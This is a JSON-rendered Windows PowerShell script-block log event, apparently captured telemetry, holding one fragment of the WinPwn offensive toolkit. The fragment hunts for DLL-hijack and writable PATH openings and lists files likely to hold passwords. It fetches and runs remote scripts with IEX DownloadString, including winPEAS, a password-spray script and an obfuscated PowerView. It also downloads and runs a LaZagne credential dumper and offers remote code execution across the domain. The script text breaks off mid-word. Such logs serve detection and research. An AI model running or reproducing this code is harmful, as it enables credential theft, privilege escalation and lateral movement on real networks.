{
  "Event": {
    "#attributes": {
      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
    },
    "System": {
      "Provider": {
        "#attributes": {
          "Name": "Microsoft-Windows-PowerShell",
          "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
        }
      },
      "EventID": 4104,
      "Version": 1,
      "Level": 3,
      "Task": 2,
      "Opcode": 15,
      "Keywords": "0x0",
      "TimeCreated": {
        "#attributes": {
          "SystemTime": "2025-12-23T12:25:40.169419Z"
        }
      },
      "EventRecordID": 3166,
      "Correlation": {
        "#attributes": {
          "ActivityID": "B908F131-6DEE-0001-A801-39B9EE6DDC01"
        }
      },
      "Execution": {
        "#attributes": {
          "ProcessID": 23052,
          "ThreadID": 9920
        }
      },
      "Channel": "Microsoft-Windows-PowerShell/Operational",
      "Computer": "swachchhanda",
      "Security": {
        "#attributes": {
          "UserID": "S-1-5-21-2555720767-1205513275-3893774561-1001"
        }
      }
    },
    "EventData": {
      "MessageNumber": 12,
      "MessageTotal": 14,
      "ScriptBlockText": "e.tostring() -like \"*\\$arg\") { $rights = $_.FileSystemRights.tostring(); Write \"Group: $arg, Permissions: $rights on $o\" } } }\r\n        if ($result -ne $null) { Write $result | Sort -Unique ; $result } else { Write \"Permissions set on scheduled binaries are correct for all groups.\" }\r\n            \r\n        \r\n        Write \"-------> Scheduled process directory permissions - try DLL injection:\"\r\n        $result = $null\r\n        $result = schtasks /query /fo LIST /V | findstr \"\\\\\" | findstr \"\\.\" | % { Trap { Continue } $o = $_.Split(\" \"); $obj = $o[30..($o.Length-1)] -join (\" \"); If ($obj -like '\"*\"*') { $o = $obj.split('\"')[1] } ElseIf ($obj -like '* -*') { $o = $obj.split('-')[0] } ElseIf ($obj -like '* /*') { $o = $obj.split('/')[0] } Else { $o = $obj }; If ($o -like '*%*%*') { $var = $o.split('%')[1]; $out = resolve($var); $o = $o.replace(\"%$var%\",$out) }; $obj = $o.Split(\"\\\"); $o = $obj[0..($obj.Length-2)] -join (\"\\\"); (Get-Acl $o 2> $null).Access } | ForEach-Object { Trap { Continue } ForEach ($arg in $arguments + $whoami.Split('\\')[1]) { if ($_.FileSystemRights.tostring() -match \"AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824\" -and $_.IdentityReference.tostring() -like \"*\\$arg\") { $rights = $_.FileSystemRights.tostring(); Write \"Group: $arg, Permissions: $rights on $o\" } } }\r\n        if ($result -ne $null) { Write $result | Sort -Unique; $result } else { Write \"Permissions set on scheduled binary directories are correct for all groups.\" }\r\n                \r\n        \r\n        Write \"-------> Loaded DLLs permissions - backdoor DLL:\"\r\n        $result = $null\r\n        $result = ForEach ($item in (Get-WmiObject -Class CIM_ProcessExecutable)) { [wmi]\"$($item.Antecedent)\" | Where-Object {$_.Extension -eq 'dll'} | Select Name | ForEach-Object { $o = $_.Name; (Get-Acl $o 2> $null).Access } | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\\')[1]) { if ($_.FileSystemRights.tostring() -match \"AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824\" -and $_.IdentityReference.tostring() -like \"*\\$arg\") { $rights = $_.FileSystemRights.tostring(); Write \"Group: $arg, Permissions: $rights on $o\" } } } }\r\n        if ($result -ne $null) { Write $result | Sort -Unique; $result } else { Write \"Permissions set on loaded DLLs are correct for all groups.\" }\r\n     }    \r\n     if(!$consoleoutput){\r\n        Write \"Files that may contain passwords:\"\r\n        $i = 0\r\n        if (Test-Path $env:SystemDrive\\sysprep.inf) { Write \"$env:SystemDrive\\sysprep.inf\" >> $currentPath\\LocalPrivEsc\\Passwordfiles.txt  ; $i = 1}\r\n        if (Test-Path $env:SystemDrive\\sysprep\\sysprep.xml) { Write \"$env:SystemDrive\\sysprep\\sysprep.xml\" >> $currentPath\\LocalPrivEsc\\Passwordfiles.txt ; $i = 1 }\r\n        if (Test-Path $env:WINDIR\\Panther\\Unattend\\Unattended.xml) { Write \"$env:WINDIR\\Panther\\Unattend\\Unattended.xml\" >> $currentPath\\LocalPrivEsc\\Passwordfiles.txt ; $i = 1 }\r\n        if (Test-Path $env:WINDIR\\Panther\\Unattended.xml) { Write \"$env:WINDIR\\Panther\\Unattended.xml\" >> $currentPath\\LocalPrivEsc\\Passwordfiles.txt ; $i = 1 }\r\n        if (Test-Path $env:WINDIR\\system32\\sysprep\\Unattend.xml) { Write \"$env:WINDIR\\system32\\sysprep\\Unattend.xml\" >> $currentPath\\LocalPrivEsc\\Passwordfiles.txt ; $i = 1 }\r\n        if (Test-Path $env:WINDIR\\system32\\sysprep\\Panther\\Unattend.xml) { Write \"$env:WINDIR\\system32\\sysprep\\Panther\\Unattend.xml\" >> $currentPath\\LocalPrivEsc\\Passwordfiles.txt ; $i = 1 }\r\n        if (Test-Path $env:WINDIR\\Panther\\Unattend\\Unattended.xml) { Write \"$env:WINDIR\\Panther\\Unattend\\Unattended.xml\" >> $currentPath\\LocalPrivEsc\\Passwordfiles.txt ; $i = 1 }\r\n        if (Test-Path $env:WINDIR\\Panther\\Unattend.xml) { Write \"$env:WINDIR\\Panther\\Unattend.xml\" >> $currentPath\\LocalPrivEsc\\Passwordfiles.txt ; $i = 1 }\r\n        if (Test-Path $env:SystemDrive\\MININT\\SMSOSD\\OSDLOGS\\VARIABLES.DAT) { Write \"$env:SystemDrive\\MININT\\SMSOSD\\OSDLOGS\\VARIABLES.DAT\" >> $currentPath\\LocalPrivEsc\\Passwordfiles.txt ; $i = 1 }\r\n        if (Test-Path $env:WINDIR\\panther\\setupinfo) { Write \"$env:WINDIR\\panther\\setupinfo\" >> $currentPath\\LocalPrivEsc\\Passwordfiles.txt ; $i = 1 }\r\n        if (Test-Path $env:WINDIR\\panther\\setupinfo.bak) { Write \"$env:WINDIR\\panther\\setupinfo.bak\" >> $currentPath\\LocalPrivEsc\\Passwordfiles.txt ; $i = 1 }\r\n        if (Test-Path $env:SystemDrive\\unattend.xml) { Write \"$env:SystemDrive\\unattend.xml\" >> $currentPath\\LocalPrivEsc\\Passwordfiles.txt ; $i = 1 }\r\n        if (Test-Path $env:WINDIR\\system32\\sysprep.inf) { Write \"$env:WINDIR\\system32\\sysprep.inf\" >> $currentPath\\LocalPrivEsc\\Passwordfiles.txt ; $i = 1 }\r\n        if (Test-Path $env:WINDIR\\system32\\sysprep\\sysprep.xml) { Write \"$env:WINDIR\\system32\\sysprep\\sysprep.xml\" >> $currentPath\\LocalPrivEsc\\Passwordfiles.txt ; $i = 1 }\r\n        if (Test-Path $env:WINDIR\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config) { Write \"$env:WINDIR\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config\" >> $currentPath\\LocalPrivEsc\\Passwordfiles.txt ; $i = 1 }\r\n        if (Test-Path $env:SystemDrive\\inetpub\\wwwroot\\web.config) { Write \"$env:SystemDrive\\inetpub\\wwwroot\\web.config\" >> $currentPath\\LocalPrivEsc\\Passwordfiles.txt ; $i = 1 }\r\n        if (Test-Path \"$env:AllUsersProfile\\Application Data\\McAfee\\Common Framework\\SiteList.xml\") { Write \"$env:AllUsersProfile\\Application Data\\McAfee\\Common Framework\\SiteList.xml\" >> $currentPath\\LocalPrivEsc\\Passwordfiles.txt ; $i = 1 }\r\n        if (Test-Path HKLM:\\SOFTWARE\\RealVNC\\WinVNC4) { Get-ChildItem -Path HKLM:\\SOFTWARE\\RealVNC\\WinVNC4 >> $currentPath\\LocalPrivEsc\\Passwordfiles.txt ; $i = 1 }\r\n        if (Test-Path HKCU:\\Software\\SimonTatham\\PuTTY\\Sessions) { Get-ChildItem -Path HKCU:\\Software\\SimonTatham\\PuTTY\\Sessions >> $currentPath\\LocalPrivEsc\\Passwordfiles.txt ; $i = 1 }\r\n        if ($i -eq 0) { Write \"Files not found.\"}\r\n        else {$out = get-content $currentPath\\LocalPrivEsc\\Passwordfiles.txt; $out }\r\n    }\r\n    else\r\n    {\r\n        Write \"-------> Files that may contain passwords:\"\r\n        $i = 0\r\n        if (Test-Path $env:SystemDrive\\sysprep.inf) { Write \"$env:SystemDrive\\sysprep.inf\" ; $i = 1}\r\n        if (Test-Path $env:SystemDrive\\sysprep\\sysprep.xml) { Write \"$env:SystemDrive\\sysprep\\sysprep.xml\" ; $i = 1 }\r\n        if (Test-Path $env:WINDIR\\Panther\\Unattend\\Unattended.xml) { Write \"$env:WINDIR\\Panther\\Unattend\\Unattended.xml\" ; $i = 1 }\r\n        if (Test-Path $env:WINDIR\\Panther\\Unattended.xml) { Write \"$env:WINDIR\\Panther\\Unattended.xml\" ;$i = 1 }\r\n        if (Test-Path $env:WINDIR\\system32\\sysprep\\Unattend.xml) { Write \"$env:WINDIR\\system32\\sysprep\\Unattend.xml\" ; $i = 1 }\r\n        if (Test-Path $env:WINDIR\\system32\\sysprep\\Panther\\Unattend.xml) { Write \"$env:WINDIR\\system32\\sysprep\\Panther\\Unattend.xml\" ; $i = 1 }\r\n        if (Test-Path $env:WINDIR\\Panther\\Unattend\\Unattended.xml) { Write \"$env:WINDIR\\Panther\\Unattend\\Unattended.xml\" ; $i = 1 }\r\n        if (Test-Path $env:WINDIR\\Panther\\Unattend.xml) { Write \"$env:WINDIR\\Panther\\Unattend.xml\" ; $i = 1 }\r\n        if (Test-Path $env:SystemDrive\\MININT\\SMSOSD\\OSDLOGS\\VARIABLES.DAT) { Write \"$env:SystemDrive\\MININT\\SMSOSD\\OSDLOGS\\VARIABLES.DAT\" ; $i = 1 }\r\n        if (Test-Path $env:WINDIR\\panther\\setupinfo) { Write \"$env:WINDIR\\panther\\setupinfo\" ; $i = 1 }\r\n        if (Test-Path $env:WINDIR\\panther\\setupinfo.bak) { Write \"$env:WINDIR\\panther\\setupinfo.bak\" ; $i = 1 }\r\n        if (Test-Path $env:SystemDrive\\unattend.xml) { Write \"$env:SystemDrive\\unattend.xml\" ; $i = 1 }\r\n        if (Test-Path $env:WINDIR\\system32\\sysprep.inf) { Write \"$env:WINDIR\\system32\\sysprep.inf\" ; $i = 1 }\r\n        if (Test-Path $env:WINDIR\\system32\\sysprep\\sysprep.xml) { Write \"$env:WINDIR\\system32\\sysprep\\sysprep.xml\" ; $i = 1 }\r\n        if (Test-Path $env:WINDIR\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config) { Write \"$env:WINDIR\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config\" ; $i = 1 }\r\n        if (Test-Path $env:SystemDrive\\inetpub\\wwwroot\\web.config) { Write \"$env:SystemDrive\\inetpub\\wwwroot\\web.config\" ; $i = 1 }\r\n        if (Test-Path \"$env:AllUsersProfile\\Application Data\\McAfee\\Common Framework\\SiteList.xml\") { Write \"$env:AllUsersProfile\\Application Data\\McAfee\\Common Framework\\SiteList.xml\" ; $i = 1 }\r\n        if (Test-Path HKLM:\\SOFTWARE\\RealVNC\\WinVNC4) { Get-ChildItem -Path HKLM:\\SOFTWARE\\RealVNC\\WinVNC4 ; $i = 1 }\r\n        if (Test-Path HKCU:\\Software\\SimonTatham\\PuTTY\\Sessions) { Get-ChildItem -Path HKCU:\\Software\\SimonTatham\\PuTTY\\Sessions ; $i = 1 }\r\n        if ($i -eq 0) { Write \"Files not found.\"}\r\n        else {$out = get-content $currentPath\\LocalPrivEsc\\Passwordfiles.txt; $out }\r\n    }\r\n    If (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] \"Administrator\")) \r\n    {\r\n        Write-Warning \"This script will not function with administrative privileges. Please run as a normal user.\"\r\n        Break\r\n    }\r\n    Write-Host -ForegroundColor Yellow 'Looking for Writable PATH variable folders:'\r\n    #Credit here https://gist.github.com/wdormann/eb714d1d935bf454eb419a34be266f6f \r\n    $outfile = \"acltestfile\"\r\n    set-variable -name paths -value (Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PATH).path.Split(\";\")\r\n    Write \"-------> Writable PATH Variable folders:\"\r\n    Foreach ($path in $paths) \r\n    {\r\n        Try {\r\n                [io.file]::OpenWrite(\"$path\\$outfile\").close()\r\n                Write-Warning \"I can write to '$path'\"\r\n              if(!$consoleoutput){echo $path >> $currentPath\\LocalPrivEsc\\Writable_PATH_Variable_Folder.txt}else{echo $path}\r\n                $insecure = 1\r\n            }\r\n            Catch {}\r\n    }\r\n    If ($insecure -eq 1) {\r\n        Write-Warning \"Any directory above is in the system-wide directory list, but can also be written to by the current user.\"\r\n        Write-Host \"This can allow privilege escalation.\" -ForegroundColor Red\r\n    } Else {\r\n        Write-Host \"Looks good! No system path can be written to by the current user.\" -ForegroundColor Green\r\n    }\r\n    if(!$consoleoutput){Reg1c1de >> $currentPath\\LocalPrivEsc\\WritebleRegistryKeys.txt}\r\n}\r\n\r\nfunction winPEAS\r\n{\r\n    # https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS wrapped in powershell\r\n    [CmdletBinding()]\r\n    Param (\r\n        [Switch]\r\n        $noninteractive,\r\n        [Switch]\r\n        $consoleoutput   \r\n    )\r\n\r\n    if(!$consoleoutput){pathcheck}\r\n    $currentPath = (Get-Item -Path \".\\\" -Verbose).FullName\r\n\r\n    REG ADD HKCU\\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 /f\r\n    if (!$noninteractive){invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString('$S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-winPEAS.ps1'');Invoke-winPEAS -command '' '';pause}'}\r\n    if ($noninteractive)\r\n    {\r\n        IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-winPEAS.ps1')\r\n        if(!$consoleoutput){Invoke-winPEAS -command ' ' >> $currentPath\\LocalPrivEsc\\winPEAS.txt}else{Invoke-winPEAS -command 'cmd'}\r\n    }\r\n    REG DELETE HKCU\\Console\\ /v VirtualTerminalLevel /f\r\n}\r\n\r\nfunction Reg1c1de\r\n{\r\n  IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Invoke-Reg1c1de.ps1')\r\n  Invoke-Reg1c1de\r\n}\r\n\r\nfunction Privescmodules\r\n{\r\n  <#\r\n        .DESCRIPTION\r\n        All privesc scripts are executed here.\r\n        Author: @S3cur3Th1sSh1t\r\n        License: BSD 3-Clause\r\n    #>\r\n    #Privilege Escalation Phase\r\n    [CmdletBinding()]\r\n    Param (\r\n        [Switch]\r\n        $noninteractive,\r\n        [Switch]\r\n        $consoleoutput   \r\n    )\r\n    if(!$consoleoutput){pathcheck}\r\n    $currentPath = (Get-Item -Path \".\\\" -Verbose).FullName\r\n\r\n    @'\r\n             \r\n__        ___       ____                 \r\n\\ \\      / (_)_ __ |  _ \\__      ___ __  \r\n \\ \\ /\\ / /| | '_ \\| |_) \\ \\ /\\ / | '_ \\ \r\n  \\ V  V / | | | | |  __/ \\ V  V /| | | |\r\n   \\_/\\_/  |_|_| |_|_|     \\_/\\_/ |_| |_|\r\n   --> local Privilege Escalation checks\r\n'@\r\n        if($noninteractive -and (!$consoleoutput))\r\n        {\r\n            itm4nprivesc\r\n            winPEAS\r\n            oldchecks\r\n            otherchecks\r\n            return\r\n        }\r\n        elseif($noninteractive -and $consoleoutput)\r\n        {\r\n            itm4nprivesc -noninteractive -consoleoutput\r\n            winPEAS -noninteractive -consoleoutput\r\n            oldchecks -noninteractive -consoleoutput\r\n            otherchecks -noninteractive -consoleoutput\r\n            return\r\n        }\r\n\r\n        \r\n        do\r\n        {\r\n            Write-Host \"================ WinPwn ================\"\r\n            Write-Host -ForegroundColor Green '1. itm4ns Invoke-PrivescCheck'\r\n            Write-Host -ForegroundColor Green '2. winPEAS! '\r\n            Write-Host -ForegroundColor Green '3. Powersploits privesc checks! '\r\n            Write-Host -ForegroundColor Green '4. All other checks! '\r\n            Write-Host -ForegroundColor Green '5. Go back '\r\n            Write-Host \"================ WinPwn ================\"\r\n            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'\r\n            \r\n            Switch ($masterquestion) \r\n            {\r\n                1{itm4nprivesc}\r\n                2{winPEAS}\r\n                3{oldchecks}\r\n                4{otherchecks}\r\n            }\r\n        }\r\n        While ($masterquestion -ne 5)  \r\n\r\n}\r\n\r\nfunction laZagnemodule\r\n{\r\n    <#\r\n        .DESCRIPTION\r\n        Downloads and executes Lazagne from AlessandroZ for Credential gathering / privilege escalation.\r\n        Author: @S3cur3Th1sSh1t\r\n        License: BSD 3-Clause\r\n    #>\r\n    #Privilege Escalation Phase\r\n    [CmdletBinding()]\r\n    Param (\r\n        [Switch]\r\n        $noninteractive,\r\n        [Switch]\r\n        $consoleoutput   \r\n    )\r\n    if(!$consoleoutput){pathcheck}\r\n    $currentPath = (Get-Item -Path \".\\\" -Verbose).FullName\r\n\r\n    if ($S3cur3Th1sSh1t_repo -eq \"https://raw.githubusercontent.com/S3cur3Th1sSh1t\")\r\n\t{\r\n\t\tInvoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/blob/master/exeFiles/wincreds.exe?raw=true' -Outfile $currentPath\\WinCreds.exe\r\n\t}\r\n\telse\r\n\t{\r\n\t\tInvoke-WebRequest -Uri ($S3cur3Th1sSh1t_repo + '/Creds/master/exeFiles/wincreds.exe') -Outfile $currentPath\\WinCreds.exe\r\n\t}\r\n    Write-Host -ForegroundColor Yellow 'Checking, if the file was killed by antivirus:'\r\n    if (Test-Path $currentPath\\WinCreds.exe)\r\n    {\r\n        Write-Host -ForegroundColor Yellow 'Not killed, Executing:'\r\n      if(!$consoleoutput){mkdir $currentPath\\Lazagne}\r\n        if(!$consoleoutput){.\\WinCreds.exe all >> \"$currentPath\\Lazagne\\Passwords.txt\"}else{.\\WinCreds.exe all}\r\n        Write-Host -ForegroundColor Yellow 'Results saved to $currentPath\\Lazagne\\Passwords.txt!'\r\n    }\r\n    else {Write-Host -ForegroundColor Red 'Antivirus got it, try an obfuscated version or In memory execution with Pupy:'}\r\n}\r\n\r\nfunction latmov\r\n{\r\n    <#\r\n        .DESCRIPTION\r\n        Looks for administrative Access on any system in the current network/domain. If Admin Access is available somewhere, Credentials can be dumped remotely / alternatively Powershell_Empire Stager can be executed.\r\n        Brute Force for all Domain Users with specific Passwords (for example Summer2018) can be done here.\r\n        Author: @S3cur3Th1sSh1t\r\n        License: BSD 3-Clause\r\n    #>\r\n    #Lateral Movement Phase\r\n    [CmdletBinding()]\r\n    Param (\r\n        [Switch]\r\n        $noninteractive,\r\n        [Switch]\r\n        $consoleoutput   \r\n    )\r\n    if(!$consoleoutput){pathcheck}\r\n    $currentPath = (Get-Item -Path \".\\\" -Verbose).FullName\r\n\r\n    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/DomainPasswordSpray.ps1')\r\n    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/view.ps1')\r\n    $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name\r\n    \r\n    \r\n    Write-Host -ForegroundColor Yellow 'Starting Lateral Movement Phase:'\r\n\r\n    Write-Host -ForegroundColor Yellow 'Searching for Domain Systems we can pwn with admin rights, this can take a while depending on the size of your domain:'\r\n\r\n    fuller >> $currentPath\\Exploitation\\LocalAdminAccess.txt\r\n\r\n    $exploitdecision = Read-Host -Prompt 'Do you want to execite code remotely on all found Systems? (yes/no)'\r\n    if ($exploitdecision -eq \"yes\" -or $exploitdecision -eq \"y\")\r\n    {\r\n        launcher\r\n    }\r\n}\r\n\r\nfunction Domainpassspray\r\n{\r\n    <#\r\n        .DESCRIPTION\r\n        Domain password spr",
      "ScriptBlockId": "0047f305-d1db-422c-a99f-b44ff657547e",
      "Path": ""
    }
  }
}
